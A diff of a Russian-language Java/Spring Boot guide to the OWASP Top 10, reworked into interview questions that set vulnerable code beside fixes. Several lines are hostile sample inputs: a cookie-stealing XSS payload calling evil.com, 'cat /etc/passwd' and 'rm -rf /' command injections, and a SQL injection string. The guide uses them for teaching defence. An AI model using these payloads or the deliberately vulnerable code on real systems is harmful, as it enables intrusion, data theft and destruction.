- Cipher cipher = Cipher.getInstance(ALGORITHM);
- byte[] combined = Base64. getDecoder().decode(encryptedData);
-
- byte[] iv = new byte[IV_SIZE];
- byte[] data = new byte[combined.length - IV_SIZE];
-
- System.arraycopy(combined, 0, iv, 0, iv.length);
- System.arraycopy(combined, iv.length, data, 0, data.length);
-
- GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);
- cipher.init(Cipher.DECRYPT_MODE, key, parameterSpec);
-
- return new String(cipher.doFinal(data));
- }
-}
-```
-
-#### 3. Правильная настройка `HTTPS`
-
-```java
-@Configuration
-public class SSLConfig {
-
- @Bean
- public TomcatServletWebServerFactory servletContainer() {
- TomcatServletWebServerFactory tomcat = new TomcatServletWebServerFactory() {
- @Override
- protected void postProcessContext(Context context) {
- SecurityConstraint securityConstraint = new SecurityConstraint();
- securityConstraint.setUserConstraint("CONFIDENTIAL");
-
- SecurityCollection collection = new SecurityCollection();
- collection.addPattern("/*");
- securityConstraint.addCollection(collection);
-
- context.addConstraint(securityConstraint);
- }
- };
-
- // Настройка SSL
- tomcat.addAdditionalTomcatConnectors(redirectConnector());
- return tomcat;
- }
-
- private Connector redirectConnector() {
- Connector connector = new Connector("org.apache.coyote.http11. Http11NioProtocol");
- connector.setScheme("http");
- connector.setPort(8080);
- connector.setSecure(false);
- connector.setRedirectPort(8443);
- return connector;
- }
-}
-```
-
-## A03:2021 Injection
-
-`Injection` уязвимости возникают, когда ненадежные данные передаются интерпретатору как часть команды или запроса. ### Типы `Injection`
-
-#### 1. `SQL Injection`
-
-Уязвимый код:
-```java
-// НИКОГДА НЕ ДЕЛАЙТЕ ТАК!
-String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
-jdbcTemplate.queryForList(query);
-```
-
-Исправленный код:
-```java
-@Repository
-public class UserRepository {
-
- @Autowired
- private JdbcTemplate jdbcTemplate;
-
- public Optional<User> findByUsernameAndPassword(String username, String password) {
- String sql = "SELECT * FROM users WHERE username =? AND password =?";
- try {
- return Optional.ofNullable(
- jdbcTemplate.queryForObject(sql, new Object[]{username, password},
- (rs, rowNum) -> mapToUser(rs)));
- } catch (EmptyResultDataAccessException e) {
- return Optional.empty();
- }
- }
-
- private User mapToUser(ResultSet rs) throws SQLException {
- User user = new User();
- user.setId(rs.getLong("id"));
- user.setUsername(rs.getString("username"));
- user.setPassword(rs.getString("password"));
- return user;
- }
-}
-```
-
-#### 2. `Command Injection`
-
-Уязвимый код:
-```java
-// НИКОГДА НЕ ДЕЛАЙТЕ ТАК!
-Process process = Runtime.getRuntime().exec("ping " + hostname);
-```
-
-Исправленный код:
-```java
-public class NetworkUtils {
-
- private static final Pattern HOSTNAME_PATTERN = Pattern.compile("^[a-zA-Z0-9.-]+$");
-
- public static boolean pingHost(String hostname) {
- if (!isValidHostname(hostname)) {
- throw new IllegalArgumentException("Invalid hostname");
- }
-
- try {
- Process process = new ProcessBuilder("ping", "-c", "1", hostname).redirectErrorStream(true).start();
-
- return process.waitFor() == 0;
- } catch (Exception e) {
- return false;
- }
- }
-
- private static boolean isValidHostname(String hostname) {
- return hostname!= null && HOSTNAME_PATTERN.matcher(hostname).matches();
- }
-}
-```
-
-#### 3. `LDAP Injection`
-
-Уязвимый код:
-```java
-// Поиск пользователей в LDAP
-String filter = "(uid=" + username + ")";
-NamingEnumeration<SearchResult> results = context.search(baseDN, filter, controls);
-```
-
-Исправленный код:
-```java
-public class LdapUserService {
-
- public List<User> searchUsers(String username) {
- // Экранирование специальных символов LDAP
- String escapedUsername = escapeLdapValue(username);
- String filter = "(uid=" + escapedUsername + ")";
-
- // Использование prepared statements для LDAP
- return ldapTemplate.search("", filter, new UserMapper());
- }
-
- private String escapeLdapValue(String value) {
- return value.replace("\\", "\\\\").replace("*", "*").replace("(", "\\(").replace(")", "\\)").replace("\0", "\\00");
- }
-}
-```
-
-### Общие методы защиты от `Injection`
-
-#### 1. Валидация и санитизация ввода
-
-```java
-public class InputValidator {
-
- private static final Pattern ALPHANUMERIC_PATTERN = Pattern.compile("^[a-zA-Z0-9]+$");
- private static final Pattern EMAIL_PATTERN =
- Pattern.compile("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
-
- public static boolean isValidUsername(String username) {
- return username!= null &&
- username.length() >= 3 &&
- username.length() <= 50 &&
- ALPHANUMERIC_PATTERN.matcher(username).matches();
- }
-
- public static boolean isValidEmail(String email) {
- return email!= null && EMAIL_PATTERN.matcher(email).matches();
- }
-
- public static String sanitizeHtml(String input) {
- if (input == null) return null;
-
- // Удаление потенциально опасных тегов
- return input.replaceAll("<script[^>]*>.*?</script>", "").replaceAll("<[^>]+>", "");
- }
-}
-```
-
-#### 2. Использование `ORM`
-
-```java
-@Repository
-public interface UserRepository extends JpaRepository<User, Long> {
-
- // JPA автоматически защищает от SQL injection
- Optional<User> findByUsername(String username);
-
- Optional<User> findByUsernameAndEmail(String username, String email);
-
- @Query("SELECT u FROM User u WHERE u.username =:username AND u.status =:status")
- Optional<User> findActiveUser(@Param("username") String username,
- @Param("status") UserStatus status);
-}
-```
-
-#### 3. `Prepared Statements` для `NoSQL`
-
-```java
-@Repository
-public class MongoUserRepository {
-
- @Autowired
- private MongoTemplate mongoTemplate;
-
- public Optional<User> findByUsername(String username) {
- // Правильное использование MongoDB Query
- Query query = Query.query(Criteria.where("username").is(username));
- return Optional.ofNullable(mongoTemplate.findOne(query, User.class));
- }
-
- // НИКОГДА НЕ ДЕЛАЙТЕ ТАК!
- // String jsonQuery = "{$where: \"this.username == '" + username + "'\"}";
- // mongoTemplate.find(new BasicQuery(jsonQuery), User.class);
-}
-```
-
-## A04:2021 Insecure Design
-
-`Insecure Design` — это категория уязвимостей, связанных с недостатками в архитектуре и дизайне системы безопасности. ### Принципы `Secure Design`
-
-#### 1. `Defense in Depth` (Многоуровневая защита)
-
-```java
-public class SecureAccountService {
-
- private final AccountRepository accountRepository;
- private final AuditService auditService;
- private final NotificationService notificationService;
-
- @Transactional
- public void transferMoney(Account from, Account to, BigDecimal amount) {
- // 1. Валидация на уровне сервиса
- validateTransfer(from, to, amount);
-
- // 2. Проверка баланса
- if (from.getBalance().compareTo(amount) < 0) {
- auditService.logFailedTransfer(from, to, amount, "INSUFFICIENT_FUNDS");
- throw new InsufficientFundsException();
- }
-
- // 3. Выполнение перевода
- from.debit(amount);
- to.credit(amount);
-
- // 4. Аудит
- auditService.logSuccessfulTransfer(from, to, amount);
-
- // 5. Уведомление
- notificationService.notifyTransfer(from, to, amount);
- }
-
- private void validateTransfer(Account from, Account to, BigDecimal amount) {
- if (amount == null || amount.compareTo(BigDecimal.ZERO) <= 0) {
- throw new IllegalArgumentException("Invalid amount");
- }
- if (from.equals(to)) {
- throw new IllegalArgumentException("Cannot transfer to same account");
- }
- // Дополнительные проверки... }
-}
-```
-
-#### 2. `Fail-Safe Defaults`
-
-```java
-public class PermissionManager {
-
- private final Map<String, Set<String>> userPermissions = new ConcurrentHashMap<>();
-
- // По умолчанию - никаких прав
- public boolean hasPermission(String username, String permission) {
- return userPermissions.getOrDefault(username, Collections.emptySet()).contains(permission);
- }
-
- // Явное предоставление прав
- public void grantPermission(String username, String permission) {
- userPermissions.computeIfAbsent(username, k -> new HashSet<>()).add(permission);
- }
-
- // Явное отзывание прав
- public void revokePermission(String username, String permission) {
- Set<String> permissions = userPermissions.get(username);
- if (permissions!= null) {
- permissions.remove(permission);
- }
- }
-}
-```
-
-#### 3. `Secure by Design Patterns`
-
-`Circuit Breaker Pattern`:
-```java
-public class CircuitBreakerTransferService {
-
- private final TransferService transferService;
- private final CircuitBreaker circuitBreaker;
-
- public void transfer(Account from, Account to, BigDecimal amount) {
- if (circuitBreaker.isOpen()) {
- throw new ServiceUnavailableException("Transfer service is temporarily unavailable");
- }
-
- try {
- transferService.transfer(from, to, amount);
- circuitBreaker.recordSuccess();
- } catch (Exception e) {
- circuitBreaker.recordFailure();
- throw e;
- }
- }
-}
-```
-
-## A05:2021 Security Misconfiguration
-
-`Security Misconfiguration` включает неправильную настройку безопасности, использование настроек по умолчанию и другие конфигурационные проблемы. ### Распространенные проблемы
-
-#### 1. Настройки по умолчанию
-
-- Административные аккаунты с default паролями
-- Включенные debugging features в production
-- Необходимые headers безопасности отключены
-
-#### 2. Избыточные права
-
-- Приложения запускаются с root правами
-- БД пользователей имеют admin права
-- `Cloud` storage buckets публично доступны
-
-#### 3. Отсутствие hardening
-
-- Устаревшее ПО
-- Не отключенные ненужные сервисы
-- Отсутствие rate limiting
-
-### Защита от `Security Misconfiguration`
-
-#### 1. `Security Headers`
-
-```java
-@Configuration
-public class SecurityHeadersConfig {
-
- @Bean
- public FilterRegistrationBean<HeaderFilter> headerFilter() {
- FilterRegistrationBean<HeaderFilter> registrationBean = new FilterRegistrationBean<>();
- registrationBean.setFilter(new HeaderFilter());
- registrationBean.addUrlPatterns("/*");
- return registrationBean;
- }
-
- public static class HeaderFilter implements Filter {
-
- @Override
- public void doFilter(ServletRequest request, ServletResponse response,
- FilterChain chain) throws IOException, ServletException {
-
- HttpServletResponse httpResponse = (HttpServletResponse) response;
-
- // Security Headers
- httpResponse.setHeader("X-Content-Type-Options", "nosniff");
- httpResponse.setHeader("X-Frame-Options", "DENY");
- httpResponse.setHeader("X-XSS-Protection", "1; mode=block");
- httpResponse.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
- httpResponse.setHeader("Content-Security-Policy", "default-src 'self'");
- httpResponse.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
-
- chain.doFilter(request, response);
- }
- }
-}
-```
-
-#### 2. `Environment-specific Configuration`
-
-```yaml
-# application.yml
-spring:
- profiles:
- active: ${SPRING_PROFILES_ACTIVE:development}
+Типичные ошибки:
+- Использование `.anyRequest().permitAll()` — отключает защиту для забытых эндпоинтов
+- Защита только на уровне URL, без `@PreAuthorize` в сервисах
+- Забытые `Actuator` эндпоинты — `/actuator/env` может содержать секреты
 
 ---
-spring:
- config:
- activate:
- on-profile: production
 
- security:
- require-ssl: true
+## Q8. (!) Какие типичные криптографические ошибки допускают разработчики?
 
- datasource:
- url: ${DATABASE_URL}
- username: ${DB_USERNAME}
- password: ${DB_PASSWORD}
+`Cryptographic Failures` (`A02:2021`) покрывает ошибки в шифровании, хэшировании и обработке чувствительных данных. Основные проблемы:
 
-management:
- endpoints:
- web:
- exposure:
- include: health,info,prometheus
- base-path: /internal
+| Ошибка | Пример | Правильный подход |
+|--------|--------|-------------------|
+| Хранение паролей в открытом виде или через `MD5`/`SHA-1` | `user.setPassword(rawPassword)` | `BCrypt`, `Argon2`, `scrypt` |
+| Слабые алгоритмы шифрования | `DES`, `3DES`, `RC4` | `AES-256-GCM` |
+| Отсутствие шифрования данных in transit | `HTTP` вместо `HTTPS` | `TLS 1.2+`, `HSTS` |
+| Хардкод ключей в коде | `private static final String KEY = "..."` | `Vault`, `AWS KMS`, `GCP KMS` |
+| Использование `ECB` mode | `AES/ECB/PKCS5Padding` | `AES/GCM/NoPadding` |
+| Переиспользование `IV`/`nonce` | Статический `IV` для `GCM` | Случайный `IV` при каждом шифровании |
+| Собственная криптография | Самописный алгоритм | Проверенные библиотеки (`BouncyCastle`, `Tink`) |
 
+> **На собеседовании** часто спрашивают: «Почему нельзя использовать `MD5` для паролей?» — потому что `MD5` быстрый (GPU перебирает миллиарды хэшей/сек), не использует соль по умолчанию, и имеет коллизии. `BCrypt` специально **замедлён** (cost factor), использует уникальную соль и устойчив к rainbow tables.
 
-## Troubleshooting
+## Q9. Как правильно хранить пароли в Java-приложении?
 
-| Симптом | Возможная причина | Решение |
-|--------|-------------------|---------|
-| Медленные операции или таймауты | Неоптимальная конфигурация, нагрузка, сеть | Профилировать; проверить лимиты и настройки; документацию по производительности в начале документа |
-| Ошибки подключения или недоступность | Неверная конфигурация, сеть, версия | Проверить host/port, credentials, совместимость версий; логи и мониторинг |
-| Неожиданное поведение | Неверное использование API или формата | Сверить с официальной документацией; разделы Best Practices и примеры в документе |
-
-## FAQ
-
-**Когда использовать эту технологию?** См. раздел «Введение» или «Когда использовать» в начале документа; выбор зависит от сценария и требований проекта.
-
-**Как настроить под production?** См. разделы по настройке, безопасности и best practices в документе; актуальные рекомендации — в официальной документации из блока «Полезные ссылки».
-
-**Где искать актуальную документацию?** В блоке «Полезные ссылки» в начале документа указаны официальные источники и смежные разделы.
-
-
----
-spring:
- config:
- activate:
- on-profile: development
-
- datasource:
- url: jdbc:h2:mem:testdb
- username: sa
- password: ""
-
- h2:
- console:
- enabled: true
-
-management:
- endpoints:
- web:
- exposure:
- include: "*"
-```
-
-#### 3. `Infrastructure` as `Code Security`
-
-```yaml
-# docker-compose.prod.yml
-version: '3.8'
-services:
- app:
- image: myapp:latest
- environment:
- - SPRING_PROFILES_ACTIVE=production
- - JAVA_OPTS=-Xmx2g -Xms2g -XX:+UseG1GC
- security_opt:
- - no-new-privileges:true
- read_only: true
- tmpfs:
- - /tmp
- user: "1001:1001" # non-root user
- networks:
- - secure_network
-
-networks:
- secure_network:
- driver: bridge
- internal: true
-```
-
-## A06:2021 Vulnerable Components
-
-Использование компонентов с известными уязвимостями — одна из наиболее распространенных проблем безопасности. ### Типы vulnerable components
-
-#### 1. `Direct Vulnerabilities`
-
-- Устаревшие версии библиотек
-- ПО с известными `CVE`
-- `Unsupported` компоненты
-
-#### 2. `Indirect Vulnerabilities`
-
-- Зависимости зависимостей
-- Транзитивные уязвимости
-- Уязвимости в runtime окружении
-
-### Методы выявления уязвимостей
-
-#### 1. `Dependency Scanning`
-
-```xml
-<!-- pom.xml -->
-<build>
- <plugins>
- <plugin>
- <groupId>org.owasp</groupId>
- <artifactId>dependency-check-maven</artifactId>
- <version>7.1.1</version>
- <executions>
- <execution>
- <goals>
- <goal>check</goal>
- </goals>
- </execution>
- </executions>
- </plugin>
- </plugins>
-</build>
-```
-
-#### 2. `Snyk / Open Source Vulnerabilities`
-
-```yaml
-#.github/workflows/security.yml
-name: Security Scan
-on:
- push:
- branches: [ main ]
- pull_request:
- branches: [ main ]
-
-jobs:
- security:
- runs-on: ubuntu-latest
- steps:
- - uses: actions/checkout@v3
- - name: Run Snyk to check for vulnerabilities
- uses: snyk/actions/maven@master
- env:
- SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
- with:
- args: --severity-threshold=high
-```
-
-#### 3. `Automated Updates`
-
-```xml
-<!-- pom.xml - Dependabot configuration -->
-<dependencyManagement>
- <dependencies>
- <!-- Regularly updated dependencies -->
- <dependency>
- <groupId>org.springframework.boot</groupId>
- <artifactId>spring-boot-starter-parent</artifactId>
- <version>3.0.0</version>
- <type>pom</type>
- <scope>import</scope>
- </dependency>
- </dependencies>
-</dependencyManagement>
-```
-
-### Рекомендации по уязвимым компонентам
-
-1. Регулярные обновления: Мониторьте и обновляйте зависимости
-2. `Minimal Dependencies`: Используйте только необходимые компоненты
-3. `Security Monitoring`: Настройте оповещения о новых уязвимостях
-4. `SBOM` (`Software Bill` of `Materials`): Ведите учет всех компонентов
-
-## A07:2021 Identification and Authentication Failures
-
-Проблемы с идентификацией и аутентификацией пользователей. ### Распространенные проблемы
-
-#### 1. `Credential Stuffing`
-
-Атаки с использованием скомпрометированных учетных данных из других сервисов. #### 2. `Brute Force Attacks`
-
-Автоматизированные попытки подбора паролей. #### 3. `Weak Password Policies`
-
-Отсутствие требований к сложности паролей. ### Защита от `Authentication Failures`
-
-#### 1. `Multi-Factor Authentication` (`MFA`)
+Единственный правильный подход — **adaptive hashing** с уникальной солью:
 
 ```java
 @Configuration
-@EnableWebSecurity
-public class MfaSecurityConfig {
+public class PasswordConfig {
 
- @Bean
- public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
- http.authorizeRequests().antMatchers("/login").permitAll().anyRequest().authenticated().and().formLogin().loginPage("/login").and().logout().logoutSuccessUrl("/login").and().sessionManagement().maximumSessions(1).maxSessionsPreventsLogin(false);
+    @Bean
+    public PasswordEncoder passwordEncoder() {
+        // BCrypt с cost factor 12 (~250ms на хэширование)
+        return new BCryptPasswordEncoder(12);
+    }
+}
 
- return http.build();
- }
+@Service
+@RequiredArgsConstructor
+public class UserService {
+
+    private final PasswordEncoder passwordEncoder;
+    private final UserRepository userRepository;
+
+    public void registerUser(String username, String rawPassword) {
+        // Пароль хэшируется с уникальной солью
+        String encoded = passwordEncoder.encode(rawPassword);
+        // encoded = "$2a$12$LJ3m4ys..." — содержит алгоритм, cost, соль и хэш
+        userRepository.save(new User(username, encoded));
+    }
+
+    public boolean authenticate(String username, String rawPassword) {
+        User user = userRepository.findByUsername(username)
+                .orElseThrow(() -> new BadCredentialsException("Invalid credentials"));
+        // matches() извлекает соль из хэша и сравнивает
+        return passwordEncoder.matches(rawPassword, user.getPassword());
+    }
 }
 ```
 
-#### 2. `Rate Limiting`
+Для новых проектов рекомендуется `Argon2` — победитель `Password Hashing Competition`:
+```java
+@Bean
+public PasswordEncoder passwordEncoder() {
+    return new Argon2PasswordEncoder(16, 32, 1, 65536, 3);
+    // saltLength=16, hashLength=32, parallelism=1, memory=64MB, iterations=3
+}
+```
+
+## Q10. Как правильно использовать AES-GCM для шифрования данных?
+
+`AES-GCM` — authenticated encryption, обеспечивает и конфиденциальность, и целостность данных:
 
 ```java
-@RestController
-@RequestMapping("/auth")
-@RateLimited
-public class AuthController {
+public class AesGcmEncryptor {
 
- private final AuthService authService;
- private final RateLimiter rateLimiter;
+    private static final String ALGORITHM = "AES/GCM/NoPadding";
+    private static final int IV_LENGTH = 12;   // 96 bit для GCM
+    private static final int TAG_LENGTH = 128;  // authentication tag
 
- @PostMapping("/login")
- public ResponseEntity<?> login(@RequestBody LoginRequest request,
- HttpServletRequest httpRequest) {
+    public byte[] encrypt(byte[] plaintext, SecretKey key) throws Exception {
+        // КРИТИЧНО: каждый раз новый IV
+        byte[] iv = new byte[IV_LENGTH];
+        SecureRandom.getInstanceStrong().nextBytes(iv);
 
- String clientIp = getClientIp(httpRequest);
+        Cipher cipher = Cipher.getInstance(ALGORITHM);
+        cipher.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(TAG_LENGTH, iv));
 
- if (!rateLimiter.allowRequest(clientIp)) {
- return ResponseEntity.status(HttpStatus.TOO_MANY_REQUESTS).body("Too many login attempts. Please try again later.");
- }
+        byte[] ciphertext = cipher.doFinal(plaintext);
 
- try {
- AuthenticationResponse response = authService.authenticate(request);
- rateLimiter.recordSuccess(clientIp);
- return ResponseEntity.ok(response);
- } catch (BadCredentialsException e) {
- rateLimiter.recordFailure(clientIp);
- throw e;
- }
- }
+        // Склеиваем IV + ciphertext для хранения
+        ByteBuffer buffer = ByteBuffer.allocate(IV_LENGTH + ciphertext.length);
+        buffer.put(iv);
+        buffer.put(ciphertext);
+        return buffer.array();
+    }
 
- private String getClientIp(HttpServletRequest request) {
- String xForwardedFor = request.getHeader("X-Forwarded-For");
- if (xForwardedFor!= null &&!xForwardedFor.isEmpty()) {
- return xForwardedFor.split(",")[0].trim();
- }
- return request.getRemoteAddr();
- }
+    public byte[] decrypt(byte[] encrypted, SecretKey key) throws Exception {
+        ByteBuffer buffer = ByteBuffer.wrap(encrypted);
+
+        byte[] iv = new byte[IV_LENGTH];
+        buffer.get(iv);
+
+        byte[] ciphertext = new byte[buffer.remaining()];
+        buffer.get(ciphertext);
+
+        Cipher cipher = Cipher.getInstance(ALGORITHM);
+        cipher.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(TAG_LENGTH, iv));
+
+        return cipher.doFinal(ciphertext); // бросит AEADBadTagException при tamper
+    }
 }
 ```
 
-#### 3. `Account Lockout`
+Главные правила:
+- **Никогда** не переиспользовать `IV` с одним и тем же ключом — это полностью ломает `GCM`
+- Хранить ключи в `Vault` / `KMS`, **не** в коде или конфиге
+- Использовать `SecureRandom.getInstanceStrong()` для генерации `IV`
+- Рассмотреть `Google Tink` — высокоуровневая обёртка, которая исключает типичные ошибки
+
+---
+
+## Q11. (!) Какие виды Injection-атак существуют и как от них защищаться?
+
+`Injection` (`A03:2021`) — когда недоверенный ввод попадает в интерпретатор без безопасной обработки. Основные виды:
+
+```mermaid
+graph TD
+    A[Injection] --> B[SQL Injection]
+    A --> C[NoSQL Injection]
+    A --> D[Command Injection]
+    A --> E[LDAP Injection]
+    A --> F[XSS<br/>HTML/JS Injection]
+    A --> G[Expression Language<br/>Injection]
+    A --> H[Template Injection<br/>SSTI]
+    
+    B --> B1["SELECT * FROM users<br/>WHERE id = '1 OR 1=1'"]
+    D --> D1["ping; rm -rf /"]
+    F --> F1["<script>steal(cookie)</script>"]
+```
+
+**Универсальные принципы защиты:**
+
+1. **Параметризованные запросы** — для SQL, LDAP, NoSQL
+2. **Валидация на входе** — whitelist допустимых символов/форматов
+3. **Экранирование на выходе** — контекстно-зависимое (HTML, JS, URL, CSS)
+4. **Принцип минимальных привилегий** — DB-пользователь не должен иметь `DROP` права
+5. **WAF** — дополнительный слой, но не замена правильного кода
+
+## Q12. (!) Как SQL Injection работает через Spring Data JPA и JDBC?
+
+`Spring Data JPA` защищает от SQL Injection **по умолчанию**, если использовать derived queries или именованные параметры. Но есть ловушки:
+
+**Уязвимый код — конкатенация в нативном запросе:**
+```java
+// ОПАСНО: прямая конкатенация в native query
+@Query(value = "SELECT * FROM users WHERE username = '" + username + "'", 
+       nativeQuery = true)
+List<User> findByUsername(String username);
+// Атака: username = "' OR '1'='1' --"
+```
+
+**Уязвимый код — JDBC без параметров:**
+```java
+// ОПАСНО: конкатенация строк
+String sql = "SELECT * FROM users WHERE username = '" + username 
+           + "' AND password = '" + password + "'";
+jdbcTemplate.queryForList(sql);
+```
+
+**Безопасный код — параметризованные запросы:**
+```java
+// JPA — derived query (безопасно)
+Optional<User> findByUsername(String username);
+
+// JPA — именованный параметр (безопасно)
+@Query("SELECT u FROM User u WHERE u.username = :username")
+Optional<User> findUser(@Param("username") String username);
+
+// JDBC — placeholder (безопасно)
+String sql = "SELECT * FROM users WHERE username = ? AND status = ?";
+jdbcTemplate.query(sql, rowMapper, username, status);
+
+// NamedParameterJdbcTemplate (безопасно)
+String sql = "SELECT * FROM users WHERE username = :username";
+MapSqlParameterSource params = new MapSqlParameterSource("username", username);
+namedJdbcTemplate.query(sql, params, rowMapper);
+```
+
+**Особый случай — динамические ORDER BY / table names:**
+```java
+// Нельзя параметризовать ORDER BY — нужен whitelist
+private static final Set<String> ALLOWED_SORT = Set.of("name", "created_at", "email");
+
+public List<User> findSorted(String sortColumn) {
+    if (!ALLOWED_SORT.contains(sortColumn)) {
+        throw new IllegalArgumentException("Invalid sort column");
+    }
+    // Безопасно: значение из whitelist
+    return jdbcTemplate.query("SELECT * FROM users ORDER BY " + sortColumn, rowMapper);
+}
+```
+
+## Q13. Что такое XSS и как от него защищаться на бэкенде?
+
+`XSS` (`Cross-Site Scripting`) — инъекция вредоносного JavaScript в страницы, которые видят другие пользователи. Бэкенд-разработчик отвечает за:
+
+**Stored XSS — сохранённый вредоносный ввод:**
+```java
+// ОПАСНО: HTML из пользовательского ввода сохраняется как есть
+@PostMapping("/api/comments")
+public Comment createComment(@RequestBody CommentRequest request) {
+    Comment comment = new Comment();
+    comment.setText(request.getText()); // "<script>fetch('evil.com?c='+document.cookie)</script>"
+    return commentRepository.save(comment);
+}
+```
+
+**Защита на бэкенде:**
+```java
+@PostMapping("/api/comments")
+public Comment createComment(@RequestBody @Valid CommentRequest request) {
+    Comment comment = new Comment();
+    // Санитизация HTML — удаляет опасные теги, оставляет безопасные
+    String sanitized = Jsoup.clean(request.getText(), Safelist.basic());
+    comment.setText(sanitized);
+    return commentRepository.save(comment);
+}
+```
+
+**Security headers** как дополнительный слой:
+```java
+// Content-Security-Policy предотвращает inline-скрипты
+http.headers(headers -> headers
+    .contentSecurityPolicy(csp -> csp
+        .policyDirectives("default-src 'self'; script-src 'self'; style-src 'self'"))
+    .xssProtection(xss -> xss.headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))
+);
+```
+
+## Q14. Что такое Command Injection и как его предотвратить?
+
+`Command Injection` — выполнение произвольных команд ОС через пользовательский ввод:
+
+**Уязвимый код:**
+```java
+// ОПАСНО: конкатенация в Runtime.exec()
+@GetMapping("/api/ping")
+public String ping(@RequestParam String host) {
+    Process p = Runtime.getRuntime().exec("ping -c 1 " + host);
+    // Атака: host = "8.8.8.8; cat /etc/passwd"
+    return readOutput(p);
+}
+```
+
+**Исправленный код:**
+```java
+private static final Pattern HOSTNAME_PATTERN = Pattern.compile("^[a-zA-Z0-9][a-zA-Z0-9.-]{0,253}$");
+
+@GetMapping("/api/ping")
+public String ping(@RequestParam String host) {
+    // 1. Whitelist-валидация формата
+    if (!HOSTNAME_PATTERN.matcher(host).matches()) {
+        throw new IllegalArgumentException("Invalid hostname");
+    }
+    
+    // 2. ProcessBuilder — аргументы передаются как отдельные элементы (не через shell)
+    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", "-W", "3", host);
+    pb.redirectErrorStream(true);
+    Process p = pb.start();
+    
+    // 3. Таймаут
+    if (!p.waitFor(5, TimeUnit.SECONDS)) {
+        p.destroyForcibly();
+        throw new TimeoutException("Ping timed out");
+    }
+    return readOutput(p);
+}
+```
+
+Ключевое: **`ProcessBuilder`** с массивом аргументов **не запускает shell**, поэтому `;`, `|`, `&&` не интерпретируются.
+
+---
+
+## Q15. (!) Чем Insecure Design отличается от implementation-багов?
+
+`Insecure Design` (`A04:2021`) — **новая категория** в 2021, подчёркивающая разницу между **дизайном** и **реализацией**:
+
+| Insecure Design | Implementation Bug |
+|---|---|
+| Архитектура не предусматривает защиту | Защита предусмотрена, но реализована с ошибкой |
+| Нельзя исправить лучшим кодом | Можно исправить фиксом конкретного бага |
+| Пример: нет rate limit на API восстановления пароля | Пример: rate limit есть, но обходится через заголовок |
+| Обнаруживается через threat modeling | Обнаруживается через SAST/DAST/пентест |
+
+**Пример insecure design** — кинотеатр без лимита на бронирование:
+```java
+// Дизайн: пользователь может забронировать неограниченное количество мест
+// Даже идеальная реализация не спасёт от ботов, скупающих все билеты
+@PostMapping("/api/bookings")
+public Booking createBooking(@RequestBody BookingRequest request) {
+    return bookingService.book(request); // Нет лимитов, нет CAPTCHA
+}
+```
+
+**Secure design:**
+```java
+@PostMapping("/api/bookings")
+@RateLimiter(name = "bookingApi")
+public Booking createBooking(@RequestBody @Valid BookingRequest request,
+                             @AuthenticationPrincipal UserDetails user) {
+    // Бизнес-правило: макс. 10 мест на сеанс на пользователя
+    int existing = bookingRepository.countByUserAndSession(user.getId(), request.getSessionId());
+    if (existing + request.getSeatCount() > 10) {
+        throw new BusinessRuleException("Maximum 10 seats per session");
+    }
+    return bookingService.book(request, user);
+}
+```
+
+## Q16. Что такое threat modeling и как его применять?
+
+`Threat modeling` — систематический анализ потенциальных угроз для системы **до начала реализации**. Самая популярная методология — **`STRIDE`**:
+
+```mermaid
+graph TD
+    S[Spoofing<br/>Подмена идентичности] --> M[Mitigation:<br/>Аутентификация, MFA]
+    T[Tampering<br/>Подмена данных] --> M2[Mitigation:<br/>Целостность, подписи]
+    R[Repudiation<br/>Отказ от действий] --> M3[Mitigation:<br/>Аудит-логи, подписи]
+    I[Information Disclosure<br/>Утечка данных] --> M4[Mitigation:<br/>Шифрование, ACL]
+    D[Denial of Service] --> M5[Mitigation:<br/>Rate limiting, scaling]
+    E[Elevation of Privilege] --> M6[Mitigation:<br/>Least privilege, RBAC]
+```
+
+**Практический процесс:**
+1. **Нарисовать DFD** (Data Flow Diagram) — компоненты, потоки данных, trust boundaries
+2. **Применить STRIDE** к каждому элементу DFD
+3. **Оценить риск** — likelihood × impact
+4. **Определить mitigations** — конкретные контрмеры
+5. **Задокументировать** — threat model живёт с проектом и обновляется
+
+> Threat modeling — это задача **разработчика**, не только security-команды. Разработчик лучше знает архитектуру и dataflow системы.
+
+## Q17. Какие secure design patterns должен знать Java-разработчик?
+
+Ключевые паттерны безопасного дизайна:
+
+**1. Defense in Depth** — несколько уровней защиты (подробнее в Q39):
+```java
+// Уровень 1: авторизация на URL
+// Уровень 2: @PreAuthorize на методе
+// Уровень 3: проверка ownership в сервисе
+// Уровень 4: Row Level Security в БД
+```
+
+**2. Fail-Safe Defaults** — по умолчанию запрещено:
+```java
+public boolean hasPermission(String user, String resource) {
+    // Если нет явного разрешения — запрет
+    return permissions.getOrDefault(user, Set.of()).contains(resource);
+}
+```
+
+**3. Complete Mediation** — каждый запрос проверяется:
+```java
+// Фильтр безопасности выполняется при КАЖДОМ запросе, не кэшируется
+@Bean
+public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
+    // Spring Security по умолчанию проверяет каждый запрос
+    http.authorizeHttpRequests(auth -> auth.anyRequest().authenticated());
+    return http.build();
+}
+```
+
+**4. Least Privilege** — минимальные права:
+```java
+// БД-пользователь приложения — только SELECT/INSERT/UPDATE
+// Миграции Flyway — отдельный пользователь с DDL правами
+```
+
+**5. Input validation at trust boundary:**
+```java
+// Валидация на входе в систему, не глубоко внутри
+@PostMapping("/api/orders")
+public Order createOrder(@RequestBody @Valid OrderRequest request) { ... }
+```
+
+---
+
+## Q18. (!) Какие типичные ошибки конфигурации безопасности встречаются в Spring Boot?
+
+`Security Misconfiguration` (`A05:2021`) — одна из самых частых причин инцидентов. Типичные проблемы в `Spring Boot`:
+
+| Ошибка | Риск | Исправление |
+|--------|------|-------------|
+| `Actuator` эндпоинты открыты | Утечка env-переменных, секретов | `management.endpoints.web.exposure.include=health,info` |
+| `H2 Console` в проде | Прямой доступ к БД | `spring.h2.console.enabled=false` в prod-профиле |
+| `Swagger UI` в проде | Раскрытие API-контракта | Отключать через профиль |
